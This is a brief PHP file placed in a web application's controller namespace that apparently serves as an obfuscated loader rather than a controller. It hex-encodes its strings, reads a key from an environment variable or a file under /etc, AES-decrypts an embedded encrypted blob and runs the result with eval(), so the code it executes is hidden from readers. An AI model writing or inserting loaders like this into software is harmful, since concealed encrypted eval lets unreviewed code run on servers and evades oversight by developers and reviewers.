<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('n5V52QKLS1zQMt+RU9WI7w==');

$c=base64_decode(

'hqSuReapsoc2c02rchwCLY45t3OoqAE3JR7CvsAZ1CjHy0DXvFFp7P3Rb4p6lZQQvItcJvWgbf2r' .
'rufIXNn0XjanVNwwfZ6iQGNRWuqZyKqeAXoMgdOaoJfJTZilOJiJRDSo6rxTNUYrp5I4xiuSCPW+' .
'ab5jNfo6kpuLu1hEr4XCe7nLj3VZXob6lW+zgoWbTRikf9hQhJkVYDu98x2+aoXHqzrwkfFmxaMR' .
'jEM05BY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

